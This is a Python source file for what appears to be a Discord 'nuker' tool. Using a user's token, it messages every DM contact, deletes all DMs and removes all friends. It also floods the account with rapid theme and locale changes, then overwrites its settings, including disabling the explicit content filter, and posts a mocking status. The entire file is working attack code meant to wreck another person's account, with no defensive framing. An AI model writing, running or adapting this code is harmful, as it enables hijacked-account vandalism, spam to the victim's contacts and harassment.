import os
import random
import requests
import threading
from colorama import Fore
from itertools import cycle
from pystyle import Write, Colors

from utilities.Settings.common import getheaders
from utilities.Plugins.DM_Deleter import DmDeleter

def SEVENEIGHTEIGHTFOURNUKER_START(token, message_Content):
    headers = getheaders(token)
    
    if threading.active_count() <= 100:
        seizure_thread = threading.Thread(target=CustomSeizure, args=(token,))
        seizure_thread.start()

    channel_ids = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
    for channel in channel_ids:
        try:
            requests.post(
                f'https://discord.com/api/v9/channels/{channel["id"]}/messages',
                headers=headers,
                data={"content": message_Content}
            )
            print(f"[ {Fore.LIGHTMAGENTA_EX}${Fore.RESET} ] Sent Message to DM: {channel['id']}")
        except Exception as e:
            print(f"[{Fore.RED}Error{Fore.RESET}] Failed to send message to DM: {e}")
    
    Write.Print(f"\n\nSent Message to ALL friends\n", Colors.purple_to_blue, interval=0.009)
    
    DmDeleter(token, channel_ids)
    Write.Print(f"\nDeleted All DMs\n", Colors.purple_to_blue, interval=0.009)

    friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
    for friend in friends:
        try:
            requests.delete(
                f'https://discord.com/api/v9/users/@me/relationships/{friend["id"]}',
                headers=headers
            )
            username = f"{friend['user']['username']}#{friend['user']['discriminator']}"
            print(f"[ {Fore.LIGHTMAGENTA_EX}${Fore.RESET} ] Removed Friend: {username}")
        except Exception as e:
            print(f"[{Fore.RED}Error{Fore.RESET}] Failed to remove friend: {e}")
    
    Write.Print(f"\nRemoved all available friends\n", Colors.purple_to_blue, interval=0.009)

    update_account_settings(token)

    Write.Print(f"\n\nDone, RIP TO THAT ACCOUNT\n", Colors.purple_to_blue, interval=0.009)
    print("Press ENTER: ", end="")
    print("")

def CustomSeizure(token):
    """Toggles user theme and locale rapidly."""
    thread = threading.current_thread()
    headers = getheaders(token)
    modes = cycle(["light", "dark"])
    while getattr(thread, "do_run", True):
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=setting)

def update_account_settings(token):
    """Updates user account settings to predefined values."""
    settings = {
        'theme': "light",
        'locale': "ja",
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'enable_tts_command': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'message_display_compact': False,
        'explicit_content_filter': '0',
        "custom_status": {"text": "EZ <3"},
        'status': "idle"
    }
    headers = getheaders(token)
    try:
        requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=settings)
        print(f"[ {Fore.LIGHTMAGENTA_EX}${Fore.RESET} ] Account settings updated.")
    except Exception as e:
        print(f"[{Fore.RED}Error{Fore.RESET}] Failed to update account settings: {e}")